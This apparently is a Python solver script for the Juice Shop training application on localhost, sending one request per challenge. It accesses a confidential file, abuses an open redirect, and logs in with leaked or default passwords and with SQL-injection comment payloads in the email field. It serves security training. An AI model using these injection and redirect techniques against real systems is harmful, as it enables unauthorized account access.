url='http://localhost:3000' # Indicate the URL without '/' at the end
# Open this URL before running the script
import requests

# ==== Nothing to do before ====
# ---- Confidential Document (Access a confidential document.)
requests.get(url+'/ftp/acquisitions.md')
# ---- Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
requests.get(url+'/rest/qwertz')
# ---- Missing Encoding (Retrieve the photo of Bjoern's cat in "melee combat-mode".)
requests.get(url+'/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg')
# ---- Outdated Whitelist (Let us redirect you to one of our crypto currency addresses which are not promoted any longer.)
requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')

# ==== Login challenges ====
# ---- Login Admin (Log in with the administrator's user account.)
# ---- Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)
requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'})
# ---- Login MC SafeSearch (Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.)
requests.post(url+'/rest/user/login', data={'email':'mc.safesearch@juice-sh.op','password':'Mr. N00dles'})
# ---- GDPR Data Erasure (Log in with Chris' erased user account.)
requests.post(url+'/rest/user/login', data={'email':'chris.pike@juice-sh.op\'--','password':'a'})
# ---- Login Amy (Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note"))
requests.post(url+'/rest/user/login', data={'email':'amy@juice-sh.op','password':'K1f.....................'})
# ---- Login Bender (Log in with Bender's user account.)
requests.post(url+'/rest/user/login', data={'email':'bender@juice-sh.op\'--','password':'a'})
# ---- Login Jim (Log in with Jim's user account.)
requests.post(url+'/rest/user/login', data={'email':'jim@juice-sh.op','password':'ncc-1701'})
# ---- Login Bjoern (Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account.)
requests.post(url+'/rest/user/login', data={'email':'bjoern.kimminich@gmail.com','password':'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='})
# ---- Leaked Access Logs (Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to. (Creating a new account with the same password does not qualify as a solution.))
requests.post(url+'/rest/user/login', data={'email':'J12934@juice-sh.op','password':'0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'})
